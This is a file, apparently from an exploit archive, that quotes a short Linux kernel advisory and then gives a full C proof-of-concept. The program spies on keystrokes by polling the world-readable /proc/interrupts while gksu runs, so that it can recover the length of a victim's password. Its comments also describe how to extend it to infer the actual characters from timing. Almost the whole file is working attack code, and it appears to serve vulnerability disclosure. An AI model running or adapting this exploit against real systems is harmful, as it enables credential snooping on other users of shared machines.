@@ -1,0 +1,213 @@
+source: http://www.securityfocus.com/bid/50573/info
+
+The Linux kernel is prone to a local information-disclosure weakness.
+
+Successful exploits allow local attackers to obtain the password length of a victim's account; information harvested may aid in further attacks.
+
+Linux kernel 3.1 and prior are vulnerable. 
+
+/*
+ * A PoC for spying for keystrokes in gksu via /proc/interrupts in Linux <= 3.1.
+ * 
+ * The file /proc/interrupts is world readable.  It contains information
+ * about how many interrupts were emitted since the system boot.  We may loop
+ * on one CPU core while the victim is executed on another, and learn the length
+ * of victim's passord via monitoring emitted interrupts' counters of the keyboard
+ * interrupt.  The PoC counts only keystrokes number, but it can be easily extended
+ * to note the delays between the keystrokes and do the statistical analysis to
+ * learn the precise input characters.
+ * 
+ * The limitations:
+ *   - it works on 2-core CPUs only.
+ *   - it works on 1-keyboard systems only.
+ *   - it doesn't carefully count the first and last keystrokes (e.g. ENTER after
+ *     the password input).
+ *   - it doesn't carefully filter keystrokes after ENTER.
+ * 
+ * by segoon from Openwall
+ *
+ * run as: gcc -Wall spy-interrupts.c -o spy-interrupts && ./spy-interrupts gksu
+ *
+ * P.S.  The harm of 0444 /proc/interrupts is known for a long time, but I
+ * was told about this specific attack vector by Tavis Ormandy just after similar
+ * PoC spy-sched was published.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <err.h>
+#include <errno.h>
+#include <string.h>
+
+
+int i8042_number;
+int ints[1024], ints_prev[1024], ints_delta[1024];
+
+char buffer[1024];
+
+int reread_ints(int *interrupts, int int_count, char **names)
+{
+    int i;
+    int n, c1, c2;
+    char s1[1024], s2[1024];
+
+    int interrupts_fd;
+    FILE *interrupts_file;
+
+    interrupts_fd = open("/proc/interrupts", O_RDONLY);
+    if (interrupts_fd == -1)
+        err(1, "open(\"/proc/interrupts\")");
+
+    interrupts_file = fdopen(interrupts_fd, "r");
+    if (interrupts_file == NULL)
+        err(1, "fdopen");
+
+    if (fseek(interrupts_file, 0, SEEK_SET) < 0)
+        err(1, "lseek");
+
+    fgets(buffer, sizeof(buffer), interrupts_file);
+
+    for (i = 0; i < int_count; i++) {
+        if (fgets(buffer, sizeof(buffer), interrupts_file) == NULL) {
+            fclose(interrupts_file);
+            return i;
+        }
+
+        if (sscanf(buffer, "%d: %d %d %s %s", &n, &c1, &c2, s1, s2) < 3) {
+            fclose(interrupts_file);
+            return i;
+        }
+
+        if (names != NULL && names[i] == NULL)
+            names[i] = strdup(s2);
+
+        interrupts[i] = c1 + c2;
+    }
+
+    fclose(interrupts_file);
+    return int_count;
+}
+
+void init_i8042_number(void)
+{
+    int i;
+    int can_be_keyboard[1024];
+    char *names[1024];
+    int number_of_interrups, can_be_keyboard_numbers;
+
+    number_of_interrups = reread_ints(ints_prev, sizeof(ints_prev), names);
+
+    /*
+     * Identify the i8042 interrupt associated with the keyboard by:
+     * 1) name should be i8042
+     * 2) interrupts count emitted in one second shouldn't be more than 100
+     */
+    for (i = 0; i < number_of_interrups; i++)
+        can_be_keyboard[i] = strcmp(names[i], "i8042") == 0;
+
+    while (1) {
+        sleep(1);
+        reread_ints(ints, sizeof(ints), NULL);
+
+        can_be_keyboard_numbers = 0;
+        for (i = 0; i < number_of_interrups; i++) {
+            can_be_keyboard[i] &= (ints[i] - ints_prev[i]) < 100;
+            if (can_be_keyboard[i])
+                can_be_keyboard_numbers++;
+
+            ints_prev[i] = ints[i];
+        }
+
+        if (can_be_keyboard_numbers == 1) {
+            for (i = 0; i < number_of_interrups; i++)
+                if (can_be_keyboard[i]) {
+                    i8042_number = i;
+                    printf("i8042 keyboard is #%d\n", i);
+                    return;
+                }
+        }
+    }
+}
+
+int i8042_read(void)
+{
+    reread_ints(ints, sizeof(ints), NULL);
+    ints_prev[i8042_number] = ints[i8042_number];
+
+    return ints[i8042_number];
+}
+
+int wait_for_program(char *pname)
+{
+    FILE *f;
+    int pid;
+    char s[1024];
+
+    snprintf(s, sizeof(s), "while :; do pgrep %s >/dev/null && break;"
+           " sleep 0.1; done", pname);
+    system(s);
+    snprintf(s, sizeof(s), "pgrep %s", pname);
+    f = popen(s, "r");
+    if (f == NULL)
+        err(1, "popen");
+
+    if (fgets(buffer, sizeof(buffer), f) == NULL)
+        err(1, "fgets");
+
+    if (sscanf(buffer, "%d", &pid) < 1)
+        err(1, "sscanf");
+
+    pclose(f);
+
+    return pid;
+}
+
+int main(int argc, char *argv[])
+{
+    int n, old, sum, i;
+    int pid;
+    char *pname = argv[1];
+
+    if (argc < 2)
+        errx(1, "usage: spy-interrupts gksu");
+
+    puts("Waiting for mouse activity...");
+    init_i8042_number();
+
+    pid = wait_for_program(pname);
+    printf("%s is %d\n", pname, pid);
+
+    old = i8042_read();
+
+    sum = 0;
+
+    while (1) {
+        n = i8042_read();
+        if (old == n)
+            usleep(10000);
+        else {
+            for (i = 0; i < n-old; i++)
+                putchar('.');
+            fflush(stdout);
+        }
+
+        sum += n - old;
+        old = n;
+
+        if (kill(pid, 0) < 0 && errno == ESRCH)
+            break;
+    }
+
+    /*
+     * #interrupts == 2 * #keystrokes.  
+     * #keystrokes = len(password) - 1  because of ENTER after the password.
+     */
+    printf("\n%d keystrokes\n", (sum-2)/2);
+
+    return 0;
+}
